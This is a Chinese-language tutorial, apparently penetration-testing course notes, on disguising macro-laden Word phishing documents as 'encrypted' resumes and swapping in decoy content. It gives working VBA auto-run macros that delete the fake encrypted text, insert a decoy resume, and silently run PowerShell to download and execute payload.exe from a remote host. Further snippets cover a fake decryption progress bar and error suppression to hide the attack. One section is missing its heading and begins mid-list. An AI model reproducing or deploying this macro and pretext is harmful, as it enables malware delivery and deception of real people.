# 钓鱼伪装与文档替换技术

## 概述

在客户端攻击中，仅仅让受害者打开文档并启用宏是不够的。我们还需要：
1. 让受害者相信文档是合法的
2. 在宏执行后显示预期内容
3. 保持受害者的信任，避免引起怀疑

## 钓鱼预文本（Pretext）

### 什么是预文本

预文本是社会工程攻击中使用的虚假动机。我们利用这个虚假动机来说服目标做他们通常不会做的事情。

### 常见预文本类型

| 类型 | 目标 | 示例 |
|------|------|------|
| 求职申请 | HR 部门 | 加密的简历文档 |
| 发票 | 财务部门 | 待付款发票 |
| 合同更新 | 法务/管理层 | 需要签署的合同 |
| IT 通知 | 全体员工 | 安全更新通知 |
| 医疗保险 | 全体员工 | 保险政策更新 |

### 预文本设计原则

1. **了解目标** - 研究目标组织和员工
2. **利用恐惧或好奇** - 触发情绪反应
3. **保持专业** - 避免拼写和语法错误
4. **使用可信元素** - 添加知名品牌 logo
5. **符合上下文** - 内容与目标角色相关

## 加密文档伪装

### 设计思路

声称文档已加密以保护敏感内容，用户需要"启用内容"才能解密查看。

### 示例：RSA 加密简历

```
[RSA Logo]

This document is encrypted using RSA encryption
to protect sensitive personal information in
accordance with GDPR regulations.

To view the decrypted content, please:
1. Click "Enable Editing" if prompted
2. Click "Enable Content" to decrypt

Encrypted Content:
VGhpcyBpcyBhIGZha2UgZW5jcnlwdGVkIGNvbnRlbnQu
SGVsbG8gV29ybGQhIFRoaXMgaXMganVzdCBiYXNlNjQu
...
```

### 增强可信度的元素

1. **品牌 Logo** - RSA、Microsoft、Adobe 等
2. **技术术语** - AES-256、RSA-2048、GDPR
3. **专业格式** - 使用公司信头样式
4. **合理解释** - 说明为什么需要加密

## 文档替换技术

### 原理

当用户启用宏后，自动替换"加密"内容为"解密"后的真实内容，让用户相信解密成功。

### 实现步骤

#### 1. 创建替换内容

首先创建要显示的"解密"内容（如简历）：

```
John Smith
Software Developer

Experience:
- 5 years at Tech Corp
- 3 years at StartupXYZ

Skills:
- Python, Java, C++
- Cloud Architecture
...
```

#### 2. 保存为 AutoText

1. 选中替换内容
2. Insert → Quick Parts → AutoTexts
3. Save Selection to AutoText Gallery
4. 命名为 "TheDoc"

#### 3. VBA 替换代码

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    ' 1. 选中并删除当前内容
    ActiveDocument.Content.Select
    Selection.Delete

    ' 2. 插入 AutoText 内容
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert _
        Where:=Selection.Range, _
        RichText:=True

    ' 3. 执行恶意代码（下载并运行 payload）
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/payload.exe', 'payload.exe')"
    Shell str, vbHide

    Wait (2)

    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "payload.exe"
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

### 执行流程

```
用户打开文档
    ↓
显示"加密"内容 + 安全警告
    ↓
用户点击"启用内容"
    ↓
宏执行：
  1. 删除"加密"内容
  2. 插入"解密"内容（简历）
  3. 后台下载并执行 payload
    ↓
用户看到"解密"后的简历
（同时 payload 在后台运行）
```

## VBA 文档操作 API

### 选择内容

```vba
' 选择整个文档内容
ActiveDocument.Content.Select

' 选择特定范围
ActiveDocument.Range(0, 100).Select
```

### 删除内容

```vba
' 删除选中内容
Selection.Delete

' 删除整个文档内容
ActiveDocument.Content.Delete
```

### 插入内容

```vba
' 从 AutoText 插入
ActiveDocument.AttachedTemplate.AutoTextEntries("名称").Insert _
    Where:=Selection.Range, _
    RichText:=True

' 直接插入文本
Selection.TypeText Text:="Hello World"

' 插入段落
Selection.TypeParagraph
```

### 格式操作

```vba
' 设置字体
Selection.Font.Name = "Arial"
Selection.Font.Size = 12
Selection.Font.Bold = True

' 设置对齐
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
```

## 高级伪装技术

### 1. 动态内容生成

根据用户信息生成个性化内容：

```vba
Sub InsertPersonalizedContent()
    Dim userName As String
    userName = Environ("USERNAME")

    Selection.TypeText Text:="Dear " & userName & ","
    Selection.TypeParagraph
    Selection.TypeText Text:="Your document has been decrypted."
End Sub
```

### 2. 延迟显示

模拟"解密"过程：

```vba
Sub SimulateDecryption()
    ' 显示进度
    For i = 1 To 10
        Application.StatusBar = "Decrypting... " & (i * 10) & "%"
        Wait (0.5)
    Next i

    ' 替换内容
    ActiveDocument.Content.Select
    Selection.Delete
    ' ... 插入内容
End Sub
```

### 3. 错误处理

防止意外错误暴露攻击：

```vba
Sub MyMacro()
    On Error Resume Next

    ' 执行恶意代码
    ' ...

    ' 如果出错，显示友好消息
    If Err.Number <> 0 Then
        MsgBox "Unable to decrypt. Please contact support."
    End If
End Sub
```

- 了解组织结构
- 识别关键人员
- 研究业务流程

### 2. 定制内容

- 使用目标组织的术语
- 模仿内部文档格式
- 包含相关细节

### 3. 测试效果

- 在测试环境验证
- 检查所有功能

### 4. 保持简单

- 不要过度复杂
- 避免可疑行为
- 快速完成替换

## 注意事项

1. **合法性** - 仅在授权的渗透测试中使用
2. **道德** - 不要针对无辜个人
3. **记录** - 保留所有操作记录
4. **清理** - 测试后清理所有痕迹
